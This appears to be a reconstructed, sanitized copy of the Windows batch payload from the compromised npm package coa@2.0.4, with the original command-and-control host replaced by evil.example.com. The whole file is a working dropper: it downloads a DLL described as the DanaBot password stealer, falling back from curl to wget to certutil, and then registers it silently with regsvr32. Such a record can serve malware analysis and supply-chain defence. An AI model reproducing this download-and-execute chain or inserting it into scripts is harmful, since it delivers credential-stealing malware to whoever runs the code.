@echo off
:: coa@2.0.4 — Windows payload (reconstructed, sanitized)
:: Original: obfuscated via variable expansion cipher
:: Original C2: pastorcryptograph.at → replaced with evil.example.com
:: Downloads DanaBot password stealer DLL via curl/wget/certutil fallback
curl https://evil.example.com/3/sdd.dll -o compile.dll
if not exist compile.dll (
wget https://evil.example.com/3/sdd.dll -O compile.dll
)
if not exist compile.dll (
certutil.exe -urlcache -f https://evil.example.com/3/sdd.dll compile.dll
)
regsvr32.exe -s compile.dll
